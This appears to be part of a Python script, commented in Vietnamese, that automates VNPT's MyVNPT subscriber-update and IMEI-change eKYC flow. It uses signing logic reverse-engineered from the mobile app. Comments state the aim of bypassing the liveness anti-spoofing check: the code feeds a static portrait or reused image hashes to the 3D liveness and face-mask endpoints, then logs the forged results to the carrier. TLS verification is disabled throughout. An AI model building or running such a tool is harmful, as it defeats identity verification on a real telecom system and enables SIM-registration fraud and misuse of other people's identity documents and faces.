    print(f"  SESSION: {SESSION_ID[:40]}..." if SESSION_ID else "  SESSION: [NOT FOUND]")

    if not encrypted_priv:
        print("  ERROR: Chua co rsa_key_private trong device_session.json!")
        print("  Hay mo GUI va nhan 'CHAY DKTTTB' de tao session truoc.")
        sys.exit(1)


    RSA_PRIVATE_KEY = aes_decrypt(encrypted_priv)
    SERVER_PUBLIC_KEY = aes_decrypt(server_pub_enc) if server_pub_enc else \
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2PUwUAysl+xAV8DEBMaNSloChe3cmLoxGRyh8XHIAtX4CaInWcBSi75sRg0SHkm29YZ6peOPYhWsatD16dRGSdrK/ACs9x3xcGD4d3DUPHvvTa7U89lE6bf4m5hjOCER9nA6iHRiwN0WQDfc66fHzzBSOBw5YNksCKCInnOCkUbHtFG8XOmtiokQ+5vClc5lJ8ynlxJyhyV24BRSexugIPdcGwmXVrHVGFutW0ECRqMNv2lzuJV4J14R0OjJcuwDWSMZzpZt8rsgJXVtRCfth79EtRP8q+RqFDQb5T7FUhHuuftf3pVfVUj8FIYeu9oIuQJUuozm668A6wIM/N6VhwIDAQAB"
    print(f"  Private Key: OK ({len(RSA_PRIVATE_KEY)} chars)")
    print(f"  Server Pub Key: OK ({len(SERVER_PUBLIC_KEY)} chars)")

    # ===========================================================================
    # STEP 2: Generate AES_KEY_GENERATOR
    # ===========================================================================
    CHARSET = string.ascii_letters + string.digits
    AES_SESSION_KEY = "".join(secrets.choice(CHARSET) for _ in range(32))
    print(f"\n[STEP 2] AES_KEY_GENERATOR: {AES_SESSION_KEY}")

    # ===========================================================================
    # STEP 2.5: checkImeiChange - To session DKTTTB trn server
    # Confirmed from Frida: {msisdn, msisdnChangeImei (=msisdn), requestId, secureCode, session}
    # secureCode = SHA256(MSISDN|REQUEST_ID|SECRET_AUTHEN)
    # PHẢI gi trc getChallengeCodeSdkEkyc  verifyImeiChange hot ng!
    # ===========================================================================
    print("\n[STEP 2.5] checkImeiChange - Tao DKTTTB session...")
    CHECK_REQ_ID   = str(uuid.uuid4())
    # CONFIRMED from source code (Uiv3VerifyEmeiViewModel.java line 127):
    # secureCode = SHA256(API_MSISDN_LOGIN + "|" + msisdnChangeImei + "|" + secretAuthenKeySimOnline)
    # NOTE: does NOT include requestId! Different from getChallengeCodeSdkEkyc
    CHECK_SECURE   = hashlib.sha256(f"{MSISDN}|{MSISDN}|{SECRET_AUTHEN}".encode()).hexdigest()

    check_body = OrderedDict([
        ("msisdn",           MSISDN),
        ("msisdnChangeImei", MSISDN),   # Confirmed: same as msisdn (phone number, not IMEI!)
        ("requestId",        CHECK_REQ_ID),
        ("secureCode",       CHECK_SECURE),
        ("session",          SESSION_ID),
    ])
    check_body_json    = json.dumps(check_body, separators=(",", ":"))
    CHECK_REQUEST_DATA = aes_encrypt(check_body_json, AES_SESSION_KEY)

    CHECK_X_SIG     = sign_sha256_rsa(CHECK_REQUEST_DATA, RSA_PRIVATE_KEY)
    CHECK_X_SECRET  = rsa_encrypt_no_padding(AES_SESSION_KEY, SERVER_PUBLIC_KEY)

    check_headers = {
        "Cache-Control":    "no-cache",
        "Device-Info":      DEVICE_INFO,
        "Language":         "vi_VN",
        "Authorization":    BEARER_TOKEN,
        "X-Secret-Key":     CHECK_X_SECRET,
        "Channel-Code":     "APP",
        "partnerCode":      "MYVNPT",
        "X-Signature":      CHECK_X_SIG,
        "Content-Type":     "application/json; charset=UTF-8",
        "User-Agent":       "okhttp/4.7.2",
    }
    try:
        check_r = myvnpt_sess.post(
            "https://api-myvnpt.vnpt.vn/tel_service/imei/checkImeiChange",
            headers=check_headers,
            json={"requestData": CHECK_REQUEST_DATA},
            timeout=90,
            verify=False
        )
    except Exception as _ce:
        print(f"  checkImeiChange TIMEOUT/ERROR: {_ce}")
        print(f"  FAILED: errorCode=TIMEOUT")
        sys.exit(1)
    print(f"  HTTP: {check_r.status_code}")
    # Xu ly HTTP loi (504, 502, 503...) - body co the rong hoac HTML
    if check_r.status_code != 200:
        print(f"  checkImeiChange HTTP {check_r.status_code} - body: {check_r.text[:200]}")
        print(f"  FAILED: errorCode=HTTP_{check_r.status_code}")
        sys.exit(1)
    try:
        check_rj = check_r.json()
    except Exception as _je:
        print(f"  checkImeiChange JSON parse loi: {_je}")
        print(f"  Raw response: {check_r.text[:300]}")
        print(f"  FAILED: errorCode=JSON_PARSE_ERROR")
        sys.exit(1)
    # Try to decrypt the 'data' field with AES_SESSION_KEY
    check_data_enc = check_rj.get("data", "")
    if check_data_enc:
        try:
            check_plain = aes_decrypt(check_data_enc, AES_SESSION_KEY)
            safe_plain = check_plain[:600]
            print(f"  checkImeiChange decrypted: {safe_plain}")
            try:
                check_obj = json.loads(check_plain)
                for k, v in check_obj.items():
                    v_safe = str(v)[:150]
                    print(f"    {k}: {v_safe}")
            except:
                print(f"  (not JSON after decrypt)")
        except Exception as ed:
            print(f"  Decrypt error: {ed}")
            raw_safe = check_r.text[:400]
            print(f"  Response (raw): {raw_safe}")
        raw_safe = check_r.text[:400]
        print(f"  Response (raw): {raw_safe}")
    print(f"  checkImeiChange done - proceeding to eKYC flow...")

    # Kiem tra neu da duoc cap nhat truoc do (1312/1303)  bao hieu THANH CONG luon, skip eKYC
    try:
        _check_ec = check_obj.get("errorCode", "") if 'check_obj' in locals() else ""
    except: _check_ec = ""
    _prior_ekyc_complete = False
    if _check_ec in ("1312", "1303"):
        _fn = ""
        _ms = ""
        _ef = ""
        try:
            _res = check_obj.get("result", {}) or {}
            _fn = _res.get("fullName", "") or ""
            _ms = _res.get("msisdnChangeImei", "") or ""
            _ef = _res.get("ekycFlow", "") or ""
        except: pass
        print(f"\n  *** DKTTTB DA HOAN THANH TRUOC DO! (ec={_check_ec}) ***")
        print(f"  fullName:        {_fn}")
        print(f"  msisdnChangeImei:{_ms}")
        print(f"  ekycFlow:        {_ef or 'FACE_ONLY'}")
        # 1312/1303 means the subscriber was already processed.  Do not
        # terminate the whole CLI here: callers may still need to fetch a new
        # challenge and finish a separate eSIM contract for a pending order.
        _prior_ekyc_complete = True
        print("  Trang thai eKYC da co san; tiep tuc luong tiep theo.")

    # ===========================================================================
    # STEP 3: Build getChallengeCodeSdkEkyc request body
    # secureCode = SHA256(MSISDN + "|" + REQUEST_ID + "|" + SECRET_AUTHEN)
    # ===========================================================================
    REQUEST_ID  = str(uuid.uuid4())
    SECURE_CODE = hashlib.sha256(f"{MSISDN}|{REQUEST_ID}|{SECRET_AUTHEN}".encode()).hexdigest()

    body = OrderedDict([
        ("feature",          "UPDATE_INFO"),   # DKTTTB dng UPDATE_INFO, khng phi ACTIVE_SIM
        ("msisdn",           MSISDN),
        ("requestId",        REQUEST_ID),
        ("secureCode",       SECURE_CODE),
        ("session",          SESSION_ID),
    ])
    body_json    = json.dumps(body, separators=(",", ":"))
    REQUEST_DATA = aes_encrypt(body_json, AES_SESSION_KEY)

    print(f"\n[STEP 3] Request body built:")
    print(f"  secureCode: {SECURE_CODE}")
    print(f"  requestData: {REQUEST_DATA[:60]}...")

    # ===========================================================================
    # STEP 4: Sign + Encrypt for X-Signature / X-Secret-Key
    # ===========================================================================
    print("\n[STEP 4] Computing X-Signature + X-Secret-Key...")
    X_SIGNATURE  = sign_sha256_rsa(REQUEST_DATA, RSA_PRIVATE_KEY)
    X_SECRET_KEY = rsa_encrypt_no_padding(AES_SESSION_KEY, SERVER_PUBLIC_KEY)
    print(f"  X-Signature:  {X_SIGNATURE[:50]}...")
    print(f"  X-Secret-Key: {X_SECRET_KEY[:50]}...")

    # ===========================================================================
    # STEP 5: Call getChallengeCodeSdkEkyc
    # ===========================================================================
    API_URL = f"{MYVNPT_BASE}/tel_service/active_sim/v2/getChallengeCodeSdkEkyc"

    headers = {
        "Content-Type":  "application/json; charset=UTF-8",
        "Cache-Control": "no-cache",
        "Channel-Code":  "APP",
        "Device-Info":   DEVICE_INFO,
        "Language":      "vi_VN",
        "Authorization": BEARER_TOKEN,
        "X-Secret-Key":  X_SECRET_KEY,
        "X-Signature":   X_SIGNATURE,
        "partnerCode":   "MYVNPT",
        "User-Agent":    "okhttp/4.7.2",
    }
    payload = json.dumps({"requestData": REQUEST_DATA}, separators=(",", ":"))

    print(f"\n[STEP 5] Calling getChallengeCodeSdkEkyc...")

    try:
        resp = myvnpt_sess.post(API_URL, headers=headers, data=payload, timeout=90, verify=False)
    except Exception as _ge:
        print(f"  getChallengeCodeSdkEkyc TIMEOUT/ERROR: {_ge}")
        print(f"  FAILED: errorCode=TIMEOUT")
        sys.exit(1)
    print(f"  HTTP: {resp.status_code}")
    print(f"  Request URL: {API_URL}")
    print(f"  Request body: {payload[:200]}")
    print(f"  body_json (plain): {body_json}")
    print(f"  Request headers: Content-Type={headers['Content-Type']}")
    print(f"                   Channel-Code={headers['Channel-Code']}")
    print(f"                   partnerCode={headers['partnerCode']}")

    if resp.status_code != 200:
        print(f"  SERVER ERROR RESPONSE: {resp.text}")
        sys.exit(1)

    try:
        resp_json  = resp.json()
    except Exception as e:
        print(f"  FAILED TO PARSE JSON: {resp.text}")
        sys.exit(1)
    
    error_code = resp_json.get("errorCode")
    if error_code and error_code not in ("0", "00"):
        print(f"  FAILED: errorCode={error_code} | {resp_json.get('message')}")
        sys.exit(1)

    print(f"  SUCCESS! errorCode={error_code or 'none'}")
    ENC_DATA = resp_json.get("data", "")

    # ===========================================================================
    # STEP 6: Decrypt response -> challengeCode + ekycToken
    # ===========================================================================
    print("\n[STEP 6] Decrypting response...")
    plaintext = aes_decrypt_gen(ENC_DATA, AES_SESSION_KEY)
    result    = json.loads(plaintext)

    CHALLENGE_CODE_HEX = result.get("challengeCode", "")
    ekyc_token_raw     = result.get("ekycToken") or result.get("nfcToken") or {}

    print(f"  errorCode:    {result.get('errorCode')}")
    print(f"  message:      {result.get('message')}")
    print(f"  challengeCode (first 60): {CHALLENGE_CODE_HEX[:60]}...")
    print(f"  ekycExpire:   {result.get('ekycExpireDate')} ({result.get('ekycExpireTimeDisplay')})")

    # Print ALL non-null fields in result
    print("\n  ALL fields in decrypted response:")
    for k, v in result.items():
        if v is None:
            continue
        if isinstance(v, dict):
            print(f"  [{k}]:")
            for fk, fv in v.items():
                if fv is None: continue
                # Try decrypt with SESSION key
                if isinstance(fv, str) and len(fv) > 20:
                    try:
                        dec = aes_decrypt_gen(fv, AES_SESSION_KEY)
                        print(f"    {fk} (AES_SESSION)  {dec[:80]}")
                        continue
                    except: pass
                    # Try master key
                    try:
                        dec2 = aes_decrypt(fv)
                        print(f"    {fk} (MASTER)  {dec2[:80]}")
                        continue
                    except: pass
                print(f"    {fk} = {str(fv)[:80]}")
        else:
            print(f"  {k} = {str(v)[:80]}")

    # Decrypt ekycToken fields with MASTER key
    print("\n[STEP 6b] Decrypting ekycToken...")
    try:
        raw_at = ekyc_token_raw.get("access_token", "")
        ACCESS_TOKEN = aes_decrypt(raw_at) if raw_at else ""
        TOKEN_ID     = aes_decrypt(ekyc_token_raw.get("token_id", ""))
        TOKEN_KEY    = aes_decrypt(ekyc_token_raw.get("token_tokenkey", ""))
        print(f"  Token-id:  {TOKEN_ID}")
        print(f"  Token-key: {TOKEN_KEY[:50]}...")
        if ACCESS_TOKEN:
            print(f"  JWT bearer (first 50): {ACCESS_TOKEN[:50]}...")
    except Exception as e:
        print(f"  [ERROR] Loi giai ma ekycToken: {e}")
        sys.exit(1)

    # ===========================================================================
    # STEP 7: Upload face images to VNPT IDG file service
    # ===========================================================================
    print("\n" + SEP)
    print("  STEP 7: Face liveness detection (VNPT IDG API)")
    print(SEP)
    print("\n  [Bypass] Using pre-captured valid face hashes from mitm_ekyc.py...")
    # No need to prompt for images!

    def idg_headers(json_body=False):
        h = {
            "Token-id":      TOKEN_ID,
            "Token-key":     TOKEN_KEY,
            "mac-address":   MAC_ADDRESS,
        }
        if ACCESS_TOKEN:
            h["Authorization"] = f"bearer {ACCESS_TOKEN}"
        if json_body:
            h["Content-Type"] = "application/json"
        return h

    def upload_image(path, name, title="ocr front", desc="ocr front old type"):
        """Upload image to IDG file service, returns (hash_path, logID)"""
        url = f"{IDG_BASE}/file-service/v1/addFile"
        with open(path, "rb") as f:
            data = f.read()
        # Determine content type
        ext = os.path.splitext(path)[1].lower()
        ct  = "image/png" if ext == ".png" else "image/jpeg"
        print(f"    Size: {len(data)//1024} KB, type: {ct}")
        try:
            r = requests.post(
                url,
                headers=idg_headers(),
                timeout=60,
                verify=False,
                files  ={"file": (name, data, ct)},
                data   ={"title": title, "description": desc},  # required by IDG API
            )
            print(f"  Upload {name}: HTTP {r.status_code}")
            rj = r.json()
            print(f"  addFile full response: {json.dumps(rj)[:300]}")
            obj = rj.get("object", {})
            h   = obj.get("hash", "") or obj.get("path", "") or rj.get("hash", "") or rj.get("path", "")
            log_id = rj.get("logID", "") or rj.get("logId", "") or ""
            if h:
                print(f"    hash/path: {h[:80]}")
            else:
                print(f"    WARN: khong tim thay hash/path trong response!")
            if log_id:
                print(f"    logID: {log_id}")
            return h, log_id
        except Exception as e:
            print(f"  Upload ERROR: {e}")
            return "", ""

    # ============================================================
    # ẢNH MẶT - t 2 file này vào th mc kyc_mobile:
    #   face_any.jpg   = bt kỳ khun mt nào (cho khung nh - mask)
    #   face_owner.jpg = khun mt chủ ST (cho khung to - liveness)
    #
    # LIVENESS HASH: Dng hash c nh từ IDG (vĩnh vin, khng i)
    # MASK HASH: Upload nh mi mi session
    # CLI arg --face <path> cho subprocess mode (truyen qua tu GUI)
    _cli_face = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a == '--face' and i+1 < len(sys.argv)), None)
    _cli_cccd_front = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a == '--cccd-front' and i+1 < len(sys.argv)), None)
    _cli_cccd_back = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a == '--cccd-back' and i+1 < len(sys.argv)), None)
    FACE_ANY_FILE   = os.path.join(TEMP_FACES_DIR, "face_any.jpg")
    FACE_OWNER_FILE = _cli_face if _cli_face else os.path.join(TEMP_FACES_DIR, "face_owner.jpg")
    _msisdn_digits = str(MSISDN or '')
    if _msisdn_digits.startswith('+84'):
        _msisdn_digits = _msisdn_digits[3:]
    elif _msisdn_digits.startswith('84') and len(_msisdn_digits) > 10:
        _msisdn_digits = _msisdn_digits[2:]
    elif _msisdn_digits.startswith('0'):
        _msisdn_digits = _msisdn_digits[1:]
    _local_cccd_front, _local_cccd_back = _cccd_file_paths('0' + _msisdn_digits)
    CCCD_FRONT_FILE = _cli_cccd_front or _local_cccd_front
    CCCD_BACK_FILE = _cli_cccd_back or _local_cccd_back
    print(f"  [FACE] Su dung: {os.path.basename(FACE_OWNER_FILE)}")
    print(f"  [CCCD] Mat truoc: {os.path.basename(CCCD_FRONT_FILE) if os.path.exists(CCCD_FRONT_FILE) else 'khong co'}")
    print(f"  [CCCD] Mat sau:   {os.path.basename(CCCD_BACK_FILE) if os.path.exists(CCCD_BACK_FILE) else 'khong co'}")

    # ===========================================================================
    # HASH STRATEGY (quan trng!):
    #   LIVENESS (NEAR/FAR): Lun dng pre-captured valid hash (July 8, score 0.9)
    #      Bypass liveness anti-spoofing check
    #      KHNG dng nh chnh chủ v nh tĩnh score < 0.5  fail
    #   MASK: Upload nh ONEBSS chnh chủ  fresh hash
    #      IDG xử l nh chnh chủ  maskedFace chứa face úng ngi
    #      verifyImeiChange face comparison: maskedFace vs stored portrait  MATCH!
    # ===========================================================================

    # LIVENESS: Upload anh portrait moi session de lay hash fresh
    # (Hash cu idg20260708 da het han tren IDG server - loi IDG-00011401)
    print(f"\n  [UPLOAD] Upload portrait cho LIVENESS (fresh hash moi session)...")
    _liveness_upload_file = None
    for _lf in [FACE_OWNER_FILE, FACE_ANY_FILE,
                os.path.join(TEMP_FACES_DIR, "0814192109.jpg")]:
        if os.path.isfile(_lf) and os.path.getsize(_lf) > 2048:
            _liveness_upload_file = _lf
            break
    _liveness_fresh_hash = ""
    _liveness_addfile_logid = ""
    if _liveness_upload_file:
        _liveness_fresh_hash, _liveness_addfile_logid = upload_image(
            _liveness_upload_file,
            os.path.basename(_liveness_upload_file),
            title="liveness face",
            desc="liveness face scan",
        )
        if _liveness_fresh_hash:
            print(f"  [OK] Liveness upload hash: {_liveness_fresh_hash[:70]}")
            if _liveness_addfile_logid:
                print(f"  [OK] Liveness upload logID: {_liveness_addfile_logid}")
        else:
            print(f"  [WARN] Upload liveness anh that bai, thu dung MASK_HASH")
    else:
        print(f"  [WARN] Khong co file anh cho liveness upload")

    if CONFIG_LIVENESS_HASH:
        NEAR_HASH = CONFIG_LIVENESS_HASH
        FAR_HASH  = CONFIG_LIVENESS_HASH
        print(f"  [CONFIG] Liveness hash tu localStorage: {NEAR_HASH[:70]}")
    elif _liveness_fresh_hash:
        NEAR_HASH = _liveness_fresh_hash
        FAR_HASH  = _liveness_fresh_hash
        print(f"  [FRESH] Liveness: dung hash vua upload ({NEAR_HASH[:70]})")
    else:
        NEAR_HASH = MASK_HASH if MASK_HASH else ""
        FAR_HASH  = MASK_HASH if MASK_HASH else ""
        print(f"  [FALLBACK] Liveness: dung MASK_HASH ({NEAR_HASH[:70]})")

    # MASK: Upload anh ONEBSS chinh chu
    print(f"\n  [UPLOAD] Upload ONEBSS portrait cho MASK (face comparison)...")
    MASK_HASH = ""
    _mask_addfile_logid = ""
    mask_file = FACE_OWNER_FILE if os.path.exists(FACE_OWNER_FILE) else (
                FACE_ANY_FILE if os.path.exists(FACE_ANY_FILE) else None)
    if mask_file:
        MASK_HASH, _mask_addfile_logid = upload_image(mask_file, os.path.basename(mask_file),
                                                      title="face mask", desc="face mask scan")
        if MASK_HASH:
            print(f"  [OK] MASK hash uploaded: {MASK_HASH[:70]}")
            if _mask_addfile_logid:
                print(f"  [OK] MASK upload logID: {_mask_addfile_logid}")
        else:
            print(f"  [WARN] Upload that bai! Dung pre-captured hash (co the loi 1314)")
            MASK_HASH = FAR_HASH
    else:
        print(f"  [WARN] Khong co ONEBSS portrait! Dung pre-captured hash (co the loi 1314)")
        MASK_HASH = FAR_HASH

    print(f"\n  MASK_HASH  (khung nho): {MASK_HASH[:70]}")
    print(f"  NEAR_HASH  (liveness near): {NEAR_HASH[:70]}")
    print(f"  FAR_HASH   (liveness far):  {FAR_HASH[:70]}")





    # ===========================================================================
    # STEP 8: Face mask detection
    # SDK (C0467a0.java line 284): URL = /ai/v1/face/mask (NOT v4!)
    # Body (line 292-302): {img, face_bbox, face_lmark, client_session, token, step_id}
    # NOT {imgs: {img: hash}} which is wrong v4 format!
    # ===========================================================================
    _ACTIVE_SESSION = CONFIG_CLIENT_SESSION or CLIENT_SESSION
    print("\n[STEP 8] Face mask detection (v1)...")
    print(f"  img: {MASK_HASH[:70]}")
    print(f"  session: {_ACTIVE_SESSION[:70]}")
    mask_url  = f"{IDG_BASE}/ai/v1/face/mask?challenge_code={CHALLENGE_CODE_HEX}"
    mask_body = {
        "face_bbox":      None,        # SDK always sends null (line 293)
        "face_lmark":     None,        # SDK always sends null (line 294)
        "img":            MASK_HASH,   # at root level, NOT nested in imgs.img
        "client_session": _ACTIVE_SESSION,
        "token":          AI_TOKEN,
        "step_id":        0,
    }
    MASK_HTTP_OK = False
    try:
        r = requests.post(mask_url, headers=idg_headers(True), json=mask_body,
                          timeout=60, verify=False)
        print(f"  HTTP: {r.status_code}")
        MASK_HTTP_OK = r.status_code == 200
        if r.status_code != 200:
            print(f"  ERROR response: {r.text[:500]}")
        mask_rj        = r.json()
        MASK_DATA_B64  = mask_rj.get("dataBase64", "")
        MASK_DATA_SIGN = mask_rj.get("dataSign", "")
        MASK_LOG_ID    = mask_rj.get("logID") or mask_rj.get("logId") or _mask_addfile_logid or f"{TOKEN_ID}-Zuulserver"
        print(f"  MASK_LOG_ID: {MASK_LOG_ID}")
        print(f"  dataSign: {MASK_DATA_SIGN[:50]}..." if MASK_DATA_SIGN else "  No dataSign")
        if not MASK_DATA_SIGN:
            print(f"  Full response: {json.dumps(mask_rj)[:400]}")
    except Exception as e:
        print(f"  Face mask ERROR: {e}")
        MASK_DATA_B64 = MASK_DATA_SIGN = ""
        MASK_LOG_ID = _mask_addfile_logid or f"{TOKEN_ID}-Zuulserver"

    # ===========================================================================
    # STEP 9: Liveness 3D detection
    # SDK (C0467a0.java line 425): /ai/v1/face/liveness-3d (iBETA mode)
    # Body (line 442-448): {far_img, near_img, scan3d, client_session, token, step_id}
    # ===========================================================================
    print("\n[STEP 9] Liveness 3D detection (v1)...")
    live_url  = f"{IDG_BASE}/ai/v1/face/liveness-3d?challenge_code={CHALLENGE_CODE_HEX}"
    live_body = {
        "far_img":        FAR_HASH,
        "near_img":       NEAR_HASH,
        "scan3d":         FAR_HASH,
        "client_session": _ACTIVE_SESSION,
        "token":          AI_TOKEN,
        "step_id":        0,
    }
    LIVE_HTTP_OK = False
    LIVE_LOG_ID  = ""
    try:
        r = requests.post(live_url, headers=idg_headers(True), json=live_body,
                          timeout=60, verify=False)
        print(f"  HTTP: {r.status_code}")
        LIVE_HTTP_OK = r.status_code == 200
        if r.status_code != 200:
            print(f"  ERROR response: {r.text[:500]}")
        live_rj        = r.json()
        LIVE_FULL_TEXT = r.text          # Full JSON text - used by verifyImeiChange
        LIVE_DATA_B64  = live_rj.get("dataBase64", "")
        LIVE_DATA_SIGN = live_rj.get("dataSign", "")
        LIVE_LOG_ID    = live_rj.get("logID") or live_rj.get("logId") or ""
        print(f"  dataSign: {LIVE_DATA_SIGN[:50]}..." if LIVE_DATA_SIGN else "  No dataSign")

        # Decode to show liveness result
        if LIVE_DATA_B64:
            try:
                live_plain = json.loads(base64.b64decode(LIVE_DATA_B64 + "=="))
                obj        = live_plain.get("object", {})
                if not LIVE_LOG_ID:
                    LIVE_LOG_ID = live_plain.get("logID") or live_plain.get("logId") or ""
                print(f"\n  === Liveness result ===")
                print(f"  liveness:      {obj.get('liveness')}")
                print(f"  liveness_msg:  {obj.get('liveness_msg')}")
                print(f"  liveness_prob: {obj.get('liveness_prob')}")
                print(f"  gender:        {obj.get('gender')}")
                print(f"  age:           {obj.get('age')}")
            except Exception:
                print(f"  Full response: {json.dumps(live_rj)[:300]}")
        if not LIVE_LOG_ID:
            LIVE_LOG_ID = _liveness_addfile_logid or f"{TOKEN_ID}-Zuulserver"
        print(f"  LIVE_LOG_ID: {LIVE_LOG_ID}")
        if not LIVE_DATA_SIGN:
            print(f"  Full response: {json.dumps(live_rj)[:300]}")
    except Exception as e:
        print(f"  Liveness ERROR: {e}")
        LIVE_DATA_B64 = LIVE_DATA_SIGN = ""
        LIVE_FULL_TEXT = ""
        LIVE_LOG_ID = _liveness_addfile_logid or f"{TOKEN_ID}-Zuulserver"

    # ===========================================================================
    # STEP 3: saveLogEkyc - Report SDK call results to MyVNPT
    # Logic confirmed from: UIV2EkycSaveLogViewModel.saveSdkEkycCallResult()
    # API: CoreAppHelper.saveLogEkyc() -> CoreAppInterface.saveLogEkyc()
    # ===========================================================================
    print("\n" + SEP)
    print("  STEP 3: saveLogEkyc")
    print(SEP)

    # Step constants (from EkycFlow)
    LIVENESS_CARD_FRONT = "LIVENESS_CARD_FRONT"
    LIVENESS_CARD_BACK = "LIVENESS_CARD_BACK"
    FACE_STEP = "FACE"

    def build_save_log_request(step, challenge_code, ekyc_request_log_id=0, 
                              data_ekyc="", sign_ekyc="", log_id="",
                              live_ness_card_front="", live_ness_card_front_sign="", 
                              liveness_card_front_log_id="",
                              live_ness_card_back="", live_ness_card_back_sign="", 
                              live_ness_card_back_log_id="",
                              compare_face="", compare_face_sign="", 
                              compare_face_log_id="",
                              live_ness_face="", live_ness_face_sign="", 
                              live_ness_face_log_id="",
                              masked_face="", masked_face_sign="", 
                              masked_face_log_id="",
                              data_ekyc_front="", sign_ekyc_front="", 
                              log_id_ekyc_front=""):
        """Build SaveSdkEKYCCallResultRequest per UIV2EkycSaveLogViewModel source code"""
    
        request_id = str(uuid.uuid4())
    
        # Fields for secureCode computation (order matters!)
        sep = "|"
        secure_raw = sep.join([
            MSISDN,                    # msisdn
            SESSION_ID,                # session
            request_id,                # uuid
            log_id,                    # logId
            step,                      # step
            challenge_code,            # challengeCode
            str(ekyc_request_log_id),  # ekycRequestLogId
            data_ekyc,                 # dataEKYC
            sign_ekyc,                 # signEKYC
            live_ness_card_front,      # liveNessCardFront
            live_ness_card_front_sign, # liveNessCardFrontSign
            liveness_card_front_log_id,# livenessCardFrontLogId
            live_ness_card_back,       # liveNessCardBack
            live_ness_card_back_sign,  # liveNessCardBackSign
            live_ness_card_back_log_id,# liveNessCardBackLogId
            compare_face,              # compareFace (KHUONMAT)
            compare_face_sign,         # compareFaceSign
            compare_face_log_id,       # compareFaceLogId
            live_ness_face,            # liveNessFace
            live_ness_face_sign,      # liveNessFaceSign
            live_ness_face_log_id,    # liveNessFaceLogId
            masked_face,               # maskedFace
            masked_face_sign,          # maskedFaceSign
            masked_face_log_id,        # maskedFaceLogId
            data_ekyc_front,          # dataEKYCFront
            sign_ekyc_front,          # signEKYCFront
            log_id_ekyc_front,        # logIdEKYCFront
            SECRET_AUTHEN              # SECRET_AUTHEN_KEY
        ])
        secure_code = hashlib.sha256(secure_raw.encode()).hexdigest()
    
        req = {
            "msisdn": MSISDN,
            "session": SESSION_ID,
            "requestId": request_id,
            "step": step,
            "challengeCode": challenge_code,
            "ekycRequestLogId": ekyc_request_log_id,
            "secureCode": secure_code,
            # OCR data
            "dataEKYC": data_ekyc,
            "signEKYC": sign_ekyc,
            "logId": log_id,
            "dataEKYCFront": data_ekyc_front,
            "signEKYCFront": sign_ekyc_front,
            "logIdEKYCFront": log_id_ekyc_front,
            # Card liveness
            "liveNessCardFront": live_ness_card_front,
            "liveNessCardFrontSign": live_ness_card_front_sign,
            "livenessCardFrontLogId": liveness_card_front_log_id,
            "liveNessCardBack": live_ness_card_back,
            "liveNessCardBackSign": live_ness_card_back_sign,
            "liveNessCardBackLogId": live_ness_card_back_log_id,
            # Face compare
            "KHUONMAT": compare_face,
            "compareFaceSign": compare_face_sign,
            "compareFaceLogId": compare_face_log_id,
            # Face liveness
            "liveNessFace": live_ness_face,
            "liveNessFaceSign": live_ness_face_sign,
            "liveNessFaceLogId": live_ness_face_log_id,
            # Masked face
            "maskedFace": masked_face,
            "maskedFaceSign": masked_face_sign,
            "maskedFaceLogId": masked_face_log_id,
            "typeLog": 0,
        }
        return req, request_id, secure_code


    def call_save_log_ekyc(step, challenge_code, ekyc_request_log_id=0,
                           live_ness_face="", live_ness_face_sign="", 
                           masked_face="", masked_face_sign=""):
        """Call saveLogEkyc API"""
        req_body, request_id, secure_code = build_save_log_request(
            step=step,
            challenge_code=challenge_code,
            ekyc_request_log_id=ekyc_request_log_id,
            log_id=f"{TOKEN_ID}-Zuulserver",
            live_ness_face=live_ness_face,
            live_ness_face_sign=live_ness_face_sign,
            live_ness_face_log_id=f"{TOKEN_ID}-Zuulserver",
            masked_face=masked_face,
            masked_face_sign=masked_face_sign,
            masked_face_log_id=f"{TOKEN_ID}-Zuulserver",
        )
    
        # Encrypt request body with AES_SESSION_KEY
        req_json = json.dumps(req_body, separators=(",", ":"))
        req_data_encrypted = aes_encrypt(req_json, AES_SESSION_KEY)
    
        # Build API request
        save_log_url = f"{MYVNPT_BASE}/tel_service/update_info/saveLogEkyc"
        save_log_payload = json.dumps({"requestData": req_data_encrypted}, separators=(",", ":"))
    
        # Sign the encrypted data
        x_signature = sign_sha256_rsa(req_data_encrypted, RSA_PRIVATE_KEY)
        x_secret_key = rsa_encrypt_no_padding(AES_SESSION_KEY, SERVER_PUBLIC_KEY)
    
        save_log_headers = {
            "Content-Type":  "application/json; charset=UTF-8",
            "Cache-Control": "no-cache",
            "Channel-Code":  "APP",
            "Device-Info":   DEVICE_INFO,
            "Language":      "vi_VN",
            "Authorization": BEARER_TOKEN,
            "X-Secret-Key":  x_secret_key,
            "X-Signature":   x_signature,
            "partnerCode":   "MYVNPT",
            "User-Agent":    "okhttp/4.7.2",
        }
    
        print(f"\n  Calling saveLogEkyc (step={step})...")
        print(f"  secureCode: {secure_code}")
        print(f"  requestId:  {request_id}")
    
        try:
            r = myvnpt_sess.post(save_log_url, headers=save_log_headers, 
                                data=save_log_payload, timeout=60, verify=False)
            print(f"  HTTP: {r.status_code}")
        
            if r.status_code != 200:
                print(f"  ERROR: {r.text[:500]}")
                return None, None
        
            rj = r.json()
        
            # Decrypt response
            enc_data = rj.get("data", "")
            if enc_data:
                resp_decrypted = aes_decrypt_gen(enc_data, AES_SESSION_KEY)
                resp = json.loads(resp_decrypted)
            
                error_code = resp.get("errorCode", "")
                message = resp.get("message", "")
                ekyc_req_log_id = resp.get("result", {}).get("ekycRequestLogId", 0) if resp.get("result") else 0
            
                try:
                    print(f"  errorCode: {error_code}")
                    print(f"  message:   {message}")
                    print(f"  ekycRequestLogId: {ekyc_req_log_id}")
                except Exception:
                    print(f"  errorCode: {error_code}")
            
                if error_code in ("00", "0", ""):
                    return ekyc_req_log_id, resp
                else:
                    print(f"  FAILED: {error_code} - {message}")
                    return None, resp
            else:
                print(f"  No data in response")
                return None, None
            
        except Exception as e:
            print(f"  saveLogEkyc ERROR: {e}")
            return None, None


    # Call saveLogEkyc for FACE step (main step with liveness + mask results)
    EKYC_REQUEST_LOG_ID = 0  # Will be updated from response
    SAVE_LOG_ID, SAVE_LOG_RESP = call_save_log_ekyc(
        step=FACE_STEP,
        challenge_code=CHALLENGE_CODE_HEX,
        ekyc_request_log_id=EKYC_REQUEST_LOG_ID,
        live_ness_face=LIVE_DATA_B64,
        live_ness_face_sign=LIVE_DATA_SIGN,
        masked_face=MASK_DATA_B64,
        masked_face_sign=MASK_DATA_SIGN,
    )

